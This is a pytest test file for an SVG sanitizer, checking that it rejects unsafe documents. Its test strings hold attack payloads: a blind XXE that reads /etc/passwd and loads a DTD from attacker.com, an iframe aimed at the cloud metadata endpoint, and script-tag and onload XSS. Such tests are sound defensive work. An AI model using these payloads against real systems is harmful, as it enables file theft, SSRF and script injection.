import pytest
from scripts.svg_security import (
    sanitize_svg,
    SVGSafetyError,
)


def test_sanitize_svg_valid_document():
    valid_svg = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
        <circle cx="50" cy="50" r="40" fill="green" />
        <path d="M 10 10 H 90 V 90 H 10 Z" fill="transparent" stroke="black"/>
    </svg>"""
    cleaned = sanitize_svg(valid_svg)
    assert "<circle" in cleaned
    assert "xmlns" in cleaned


def test_sanitize_svg_blocks_doctype():
    xxe_payload = """<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg [
        <!ELEMENT svg ANY >
    ]>
    <svg viewBox="0 0 100 100"><circle cx="10" cy="10" r="5"/></svg>"""
    with pytest.raises(SVGSafetyError) as excinfo:
        sanitize_svg(xxe_payload)
    assert "Prohibited DOCTYPE declaration" in str(excinfo.value)


def test_sanitize_svg_blocks_blind_xxe_oob():
    blind_xxe = """<?xml version="1.0"?>
    <!DOCTYPE svg [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
        %dtd;
    ]>
    <svg><text>test</text></svg>"""
    with pytest.raises(SVGSafetyError) as excinfo:
        sanitize_svg(blind_xxe)
    assert "Prohibited" in str(excinfo.value)


def test_sanitize_svg_blocks_dangerous_script_tag():
    xss_svg = """<svg xmlns="http://www.w3.org/2000/svg">
        <script>alert(1)</script>
    </svg>"""
    with pytest.raises(SVGSafetyError) as excinfo:
        sanitize_svg(xss_svg)
    assert "Dangerous tag '<script>'" in str(excinfo.value)


def test_sanitize_svg_blocks_foreign_object_and_event_handlers():
    foreign_svg = """<svg xmlns="http://www.w3.org/2000/svg">
        <foreignObject width="100" height="100">
            <iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
        </foreignObject>
    </svg>"""
    with pytest.raises(SVGSafetyError):
        sanitize_svg(foreign_svg)

    onload_svg = """<svg xmlns="http://www.w3.org/2000/svg" onload="alert('pwn')">
        <rect width="10" height="10"/>
    </svg>"""
    with pytest.raises(SVGSafetyError) as excinfo:
        sanitize_svg(onload_svg)
    assert "event handler 'onload'" in str(excinfo.value)
